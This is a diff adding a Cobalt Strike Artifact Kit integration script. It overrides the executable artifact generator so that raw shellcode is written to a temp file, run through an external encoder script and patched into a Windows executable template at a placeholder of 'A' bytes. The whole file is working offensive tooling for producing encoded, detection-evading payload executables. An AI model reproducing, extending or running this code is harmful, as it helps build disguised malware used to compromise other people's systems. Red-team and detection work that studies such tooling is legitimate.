@@ -1,0 +1,52 @@
+# Artifact Kit Integration Script
+
+# Windows Executables and DLLs
+#
+# Arguments
+# 	$1 = artifact file (e.g., artifact32.exe)
+# 	$2 = shellcode
+# Return 
+#	our generated artifact
+set EXECUTABLE_ARTIFACT_GENERATOR {
+	local('$handle $data $key $index $payload $resource $buffer $b $x');
+
+	($resource, $payload) = @_;
+
+	$temp = openf(">/tmp/ridgwayunencoded.bin");          
+	writeb($temp, $payload);
+	closef($temp);	
+
+	$msf = exec("/opt/cobaltstrike-artifactkit/artifact/dist-ridgway/encode_payload.sh");
+	wait($msf);
+	closef($msf);
+	$in = openf("/tmp/ridgwayencoded.bin");
+	$encoded_payload = readb($in, -1);
+	closef($in);
+	# try again or use the default artifact... I don't have it!
+	if (!-exists script_resource($resource)) {
+		return $null;
+	}
+
+	# read in the executable template
+	$handle = openf(script_resource($resource));
+	$data = readb($handle, -1);
+	closef($handle);
+
+	# find the location of our data in the executable
+	$index = indexOf($data, 'A' x 1536);
+
+	# pack data into a buffer 
+	$buffer = allocate(1536);
+
+	# pack our encoded payload into the buffer
+	for ($x = 0; $x < strlen($encoded_payload); $x++) {
+		writeb($buffer, chr((byteAt($encoded_payload, $x))));
+	}
+
+	# retrieve the contents of the buffer.
+	closef($buffer);
+	$b = readb($buffer, -1);
+
+	# return our encoded shellcode.
+	return replaceAt($data, "$[1024]b", $index);
+}
